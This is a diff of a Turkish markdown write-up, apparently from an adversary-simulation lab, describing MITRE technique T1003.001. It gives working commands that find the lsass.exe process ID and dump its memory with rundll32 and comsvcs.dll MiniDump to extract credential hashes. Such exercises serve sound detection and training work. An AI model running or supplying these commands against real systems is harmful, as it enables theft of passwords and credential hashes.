@@ -1,8 +1,14 @@
-İlk olarak cmd.exe'yi Administrator (Yönetici) yetkileriyle açıyorum. Windows'un şifre özetlerini (hash) tutan lsass.exe sürecinin PID (Process ID) numarasını bulmak için tasklist aracını kullanıyorum:
-```text
+# 💥 Simülasyon 01: LSASS Bellek Dökümü (Credential Access - T1003.001)
+
+## 🎯 Senaryo
+Saldırgan, LSASS sürecinin belleğini kopyalayarak sistem belleğinden düz metin şifreleri ve kimlik bilgisi özetlerini (hash) çıkarmaya çalışır.
+
+## 🛠️ Uygulama (Windows Komut Satırı)
+`cmd.exe`'yi Yönetici (Administrator) olarak açtım. İlk olarak `tasklist` kullanarak `lsass.exe`'nin İşlem Kimliğini (PID) buldum. Ardından bellek dökümünü diske yazmak için `comsvcs.dll` içindeki `MiniDump` fonksiyonunu `rundll32.exe` ile tetikledim.
+
+```cmd
+# 1. lsass.exe'nin PID değerini bul
 tasklist | findstr lsass.exe
 
-Çıktıda yan tarafta yazan sayı (örn: 648) PID değeri oluyor. Daha sonra aşağıdaki komutu çalıştırarak comsvcs.dll içerisindeki MiniDump fonksiyonunu tetikliyorum. Bu komut, LSASS sürecinin tam bir bellek dökümünü diske yazar.
-
-```text
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\temp\lsass.dmp fullğ
+# 2. LSASS belleğini kopyala (PID'nin 648 olduğu varsayılmıştır)
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 648 C:\temp\lsass.dmp full
